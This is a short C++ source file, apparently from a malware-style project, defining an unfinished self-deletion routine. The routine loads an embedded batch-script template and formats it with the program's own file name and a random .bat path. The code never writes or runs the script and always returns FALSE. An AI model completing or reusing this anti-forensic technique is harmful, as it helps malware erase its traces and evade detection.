#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

BOOL fnSelfDelete(
	_In_ WCHAR szCd[],
	_In_ WCHAR szMfn[]
) {
	LPVOID lpBuffer = NULL;
	DWORD dwBufferSize =  NULL;
	HANDLE hHeap = GetProcessHeap();
	std::wstring szBat = szCd + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".bat";

	if (fnLoadResourceW(101, lpBuffer, &dwBufferSize)) {
		LPVOID pszDest = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (dwBufferSize + ((lstrlen(szMfn) * 2) * 2) + (lstrlen(szBat.c_str()))));
		if (pszDest) {
			SIZE_T ulHeap = HeapSize(hHeap, NULL, pszDest);
			if (ulHeap != (SIZE_T)-1) {
				ulHeap /= 2;

				if (SUCCEEDED(StringCchPrintf((LPWSTR)pszDest, ulHeap, (LPCWSTR)lpBuffer, szMfn, szMfn, szBat))) {

				}
			}
		}
	}

	return FALSE;
}